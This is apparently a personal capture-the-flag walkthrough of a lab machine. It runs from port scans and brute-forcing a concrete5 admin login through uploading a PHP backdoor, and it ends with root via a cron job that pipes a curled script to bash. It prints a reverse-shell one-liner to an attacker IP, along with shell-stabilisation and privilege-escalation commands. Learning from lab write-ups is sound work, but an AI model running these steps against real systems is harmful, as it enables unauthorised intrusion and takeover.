## Scans

Nmap:

```php
Nmap scan report for 10.10.200.205
Host is up, received user-set (0.023s latency).
Scanned at 2024-07-10 05:00:30 EDT for 36s
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
85/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0H N0! PWN3D 4G4IN
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
OS fingerprint not ideal because: Didn't receive UDP response. Please try again with -sSU
Aggressive OS guesses: Linux 5.4 (92%), Linux 3.10 - 3.13 (92%), Crestron XPanel control system (91%), ASUS RT-N56U WAP (Linux 3.4) (90%), Linux 3.16 (90%), Sony Android TV (Android 5.0) (88%), Android 5.0 - 6.0.1 (Linux 3.4) (88%), Android 5.1 (88%), Android 7.1.1 - 7.1.2 (88%), Android 7.1.2 (Linux 3.4) (88%)
```

Whatweb

```php
WhatWeb report for http://10.10.200.205:85
Status    : 200 OK
Title     : 0H N0! PWN3D 4G4IN
IP        : 10.10.200.205
Country   : RESERVED, ZZ

Summary   : Apache[2.4.7], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.7 (Ubuntu)]

Detected Plugins:
[ Apache ]
	The Apache HTTP Server Project is an effort to develop and
	maintain an open-source HTTP server for modern operating
	systems including UNIX and Windows NT. The goal of this
	project is to provide a secure, efficient and extensible
	server that provides HTTP services in sync with the current
	HTTP standards.

	Version      : 2.4.7 (from HTTP Server Header)
	Google Dorks: (3)
	Website     : http://httpd.apache.org/

[ HTML5 ]
	HTML version 5, detected by the doctype declaration


[ HTTPServer ]
	HTTP server header string. This plugin also attempts to
	identify the operating system from the server header.

	OS           : Ubuntu Linux
	String       : Apache/2.4.7 (Ubuntu) (from server string)

HTTP Headers:
	HTTP/1.1 200 OK
	Date: Wed, 10 Jul 2024 09:01:01 GMT
	Server: Apache/2.4.7 (Ubuntu)
	Last-Modified: Tue, 28 Nov 2023 23:50:02 GMT
	ETag: "287-60b3f13c06c99-gzip"
	Accept-Ranges: bytes
	Vary: Accept-Encoding
	Content-Encoding: gzip
	Content-Length: 380
	Connection: close
	Content-Type: text/html
```

Feroxbuster:

```php
200      GET       38l       67w      871c http://10.10.200.205:85/app/
```

---

I find a webpage on port 85:

![[Pasted image 20240710103108.png]]

Looking at the scans we find further pages:

![[Pasted image 20240710103158.png]]

![[Pasted image 20240710103220.png]]

Has some type of comment system:

![[Pasted image 20240710103610.png]]

Could be a possible username:

![[Pasted image 20240710103720.png]]

On the same page we also have another message system:

![[Pasted image 20240710103810.png]]

I find a `concrete5` login page with gobuster:

![[Pasted image 20240710104850.png]]

```php
➜  mkingdom gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.10.200.205:85/app/castle/index.php
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.200.205:85/app/castle/index.php
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/search               (Status: 200) [Size: 7500]
/blog                 (Status: 200) [Size: 11229]
/contact              (Status: 200) [Size: 13839]
/login                (Status: 200) [Size: 9613]
/account              (Status: 200) [Size: 9613]
```

Found an interesting redirect:

![[Pasted image 20240710112058.png]]

---

```php
uName=test&uPassword=test&ccm_token=1720617297%3A6628dcade8fb9c717780ec81ccb38319
```

I try running burp to brute forcing the password for the top 1000 and notice we get a change in length which indicates a successful login:

![[Pasted image 20240710142435.png]]

I login and try looking for a way to upload a reverse shell, or backdoor for fun. After finding an upload section i realise i can't upload php so i end up finding the allowed file types section:

![[Pasted image 20240710144550.png]]

I add php to the end and save the file type:

![[Pasted image 20240710144643.png]]

I've never used the backdoor so i decided to see how it works, or even if it works.

![[Pasted image 20240710144808.png]]

We get one of the backdoors working which gives us command injection:

![[Pasted image 20240710145243.png]]

I get rev shell:

![[Pasted image 20240710145853.png]]

Stabilise shell:

```php
python -c "import pty; pty.spawn('/bin/bash')"
```


## Stabilizing the Shell

**On target machine:**

- Run one (1) of the below commands to upgrade your shell:

```
python -c "import pty; pty.spawn('/bin/bash')"
ruby -e "exec '/bin/bash'"
perl -e "exec '/bin/bash';"
```

- Now, background it

```
$ Ctrl+Z
```

**On attacker machine:**

- disable text display on the attacker machine and then switch to the foregrounded process (the target’s machine)

```
stty raw -echo && fg
```

**On target machine:**

- set the terminal environment to something more appealing (e.g. xterm, xterm-256, etc)

```
export TERM=xterm-256-color
```

You should now have a stabilized bash shell that can tab complete, clear the screen, and use Ctrl+C!

##### Linpeas

![[Pasted image 20240710153436.png]]

![[Pasted image 20240710153808.png]]

![[Pasted image 20240710154217.png]]

![[Pasted image 20240710154424.png]]

Possible pass for toad:toadisthebest

![[Pasted image 20240710154546.png]]

find SUID files:

```php
find / -type f -perm -04000 -ls 2>/dev/null
```

Cat .bashrc in Toad home directory:

![[Pasted image 20240710161609.png]]

```php
echo -n "aWthVGVOVEFOdEVTCg==" | base64 -d
```

DecodedPass:ikaTeNTANtES

It was Mario's password. We also saw this in linpeas after re-running it with the toad account.

![[Pasted image 20240710162947.png]]

![[Pasted image 20240710162106.png]]

We couldn't use cat so strings revealed the first flag:

![[Pasted image 20240710162308.png]]

Now we will re-run linpeas and see if we can get root. I'm mostly running linpeas  so i can get used to it's output. 

Some enum:

![[Pasted image 20240710163625.png]]

We upload pspy32s and perfor a scan:

![[Pasted image 20240710165758.png]]

I notice that a script is calling back and we can use that with the hosts file to possibly call back to my machine to get root. 

```output
2024/07/10 12:00:01 CMD: UID=0     PID=17857  | bash 
2024/07/10 12:00:01 CMD: UID=0     PID=17856  | curl mkingdom.thm:85/app/castle/application/counter.sh 
2024/07/10 12:00:01 CMD: UID=0     PID=17855  | CRON 
2024/07/10 12:00:01 CMD: UID=0     PID=17854  | /bin/sh -c curl mkingdom.thm:85/app/castle/application/counter.sh | bash >> /var/log/up.log
```

A request is made to mkingdom.thm and then the file is executed. How can we exploit this though?

Well.. we can start by redirecting mkingdom.thm to our VPN IP, making a bash script to spawn us with a shell and then waiting for the automatic job to run and execute our script! We start by making our bash script:

![](https://powerctf.gitbook.io/~gitbook/image?url=https%3A%2F%2F2709942180-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252Fs2fs2IrGlfFCh93yzj4Y%252Fuploads%252FfCVI4fM6Tj6cWWQTfeiE%252Fimage.png%3Falt%3Dmedia%26token%3D867027fe-9be3-45f4-ad31-e34c75570125&width=768&dpr=4&quality=100&sign=836fc67c&sv=1)

```bash
bash -c "bash -i >& /dev/tcp/10.9.0.241:8888 0>&1"
```

We'll then need to create the necessary directories for the script to find the file it's searching for.

![[Pasted image 20240710170635.png]]

Had to fix the terminal with:

```bash
export TERM=xterm
```

I setup the servers:

![[Pasted image 20240710172251.png]]

I got a 404 so i've tried to move back out of the app directory which worked. I also noticed i had forgot the bin/bash tag on my script.

Small error in script, changed : for a / in the address. Now we get root:

![[Pasted image 20240711044125.png]]

